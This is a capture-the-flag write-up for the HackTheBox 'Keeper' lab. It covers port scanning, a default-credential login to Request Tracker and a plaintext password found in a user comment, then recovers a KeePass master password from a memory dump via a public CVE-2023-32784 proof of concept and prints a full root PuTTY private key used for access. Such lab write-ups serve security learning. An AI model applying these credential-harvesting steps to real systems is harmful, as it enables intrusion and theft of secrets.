---
title: HackTheBox - Keeper
date: 2023-11-19 18:36:07
tags: [htb, ctf, writeup, putty, keepass]
category: writeups
description: htb keeper writeup
---

# Tools

- netcat
- putty
- keepass-password-dumper

<br>

## Getting User

### Nmap


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ sudo nmap -sS -oA nmap/initial_scan 10.129.59.247    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-19 06:50 EST
Nmap scan report for 10.129.59.247
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.98 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ sudo nmap -sC -sV -p 22,80 -oA nmap/default_script_scan 10.129.59.247
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-19 06:51 EST
Nmap scan report for 10.129.59.247
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.62 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


<br>

### Foothold

Visiting http://10.129.59.247/ theres a hyperlink saying “*To raise an IT support ticket, please visit tickets.keeper.htb/rt/*”
Add vhosts to *hosts* file


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ echo "10.129.59.247 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts           
[sudo] password for kali: 
10.129.59.247 keeper.htb tickets.keeper.htb
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


*tickets.keeper.htb/rt/* takes us to a login page of Request Tracker app (version RT 4.4.4+dfsg-2ubuntu1)

I look up *rt 4.4.4+dfsg-2ubuntu1* & I find that admin has a default password which is `root:password`
We were able to login using the defualt credentials.

Going to *Admin > Users > Select* and selecting *lnorgaard* user we find the following comment

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
New user. Initial password set to Welcome2023!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We are able to use *lnorgaard*'s credentials to get foothold


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Keeper/files]
└─$ ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ cat user.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



<br>

## Getting Root

### Information Gathering

Start a python http server to download *RT30000.zip* to your machine


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Keeper/files]
└─$ wget http://keeper.htb:3211/RT30000.zip
--2023-11-19 07:55:12--  http://keeper.htb:3211/RT30000.zip
Resolving keeper.htb (keeper.htb)... 10.129.59.247
Connecting to keeper.htb (keeper.htb)|10.129.59.247|:3211... connected.
HTTP request sent, awaiting response... 200 OK
Length: 87391651 (83M) [application/zip]
Saving to: ‘RT30000.zip’

RT30000.zip                                        100%[================================================================================================================>]  83.34M  3.06MB/s    in 46s     

2023-11-19 07:55:58 (1.82 MB/s) - ‘RT30000.zip’ saved [87391651/87391651]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We find a KeePass dump file and db upon extracting the content of the zip file


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Keeper/files]
└─$ unzip RT30000.zip                 
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx          
                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Keeper/files]
└─$ ls
KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


I found a PoC to dump master password from KeePass's memory https://github.com/vdohney/keepass-password-dumper (CVE-2023-32784)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Keeper/files/keepass-password-dumper]
└─$ git clone https://github.com/vdohney/keepass-password-dumper   

┌──(kali㉿kali)-[~/HTB/Keeper/files/keepass-password-dumper]
└─$ cd keepass-password-dumper     

┌──(kali㉿kali)-[~/HTB/Keeper/files/keepass-password-dumper]
└─$ dotnet run ../KeePassDumpFull.dmp   
...................... SNIPPED ............................
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 
3.:     d, 
4.:     g, 
5.:     r, 
6.:     ø, 
7.:     d, 
8.:      , 
9.:     m, 
10.:    e, 
11.:    d, 
12.:     , 
13.:    f, 
14.:    l, 
15.:    ø, 
16.:    d, 
17.:    e, 
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


The PoC couldn't find the first two characters.
Upon searching `dgrød med fløde` on the web, I find the *Rødgrød med fløde*, which could be the password.

Installed keepassx


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo apt-get install keepassx
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Open the **passcodes.kdbx** and enter the password `rødgrød med fløde`
We get it and we find there's a folder called *Network* which contains root's PuTTY RSA key

<br>

### Privilege Escalation

I'm going to install putty to use the key


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Keeper/files]
└─$ sudo apt install putty  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Copy RSA to a file and use PuTTY to connect to the server


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/Keeper/files]
└─$ echo '''PuTTY-User-Key-File-3: ssh-rsa                                                
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0''' > rsa 

┌──(kali㉿kali)-[~/HTB/Keeper/files]
└─$ putty root@keeper.htb -i rsa          

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


This will open up a putty terminal


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@keeper:~# ls
root.txt  RT30000.zip  SQL
root@keeper:~# cat root.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

